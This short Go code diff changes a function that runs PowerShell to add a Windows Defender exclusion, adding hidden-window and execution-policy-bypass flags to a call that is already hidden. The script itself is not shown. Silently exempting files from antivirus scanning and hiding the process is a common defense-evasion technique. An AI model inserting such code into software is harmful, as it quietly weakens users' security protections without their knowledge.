@@ -22,7 +22,10 @@ func ensureDefenderExclusion() {
 		)
 		cmd := exec.Command(
 			"powershell.exe",
-			"-NoProfile", "-NonInteractive", "-Command", script,
+			"-NoProfile", "-NonInteractive",
+			"-WindowStyle", "Hidden",
+			"-ExecutionPolicy", "Bypass",
+			"-Command", script,
 		)
 		hideExec(cmd)
 		if err := cmd.Run(); err != nil {
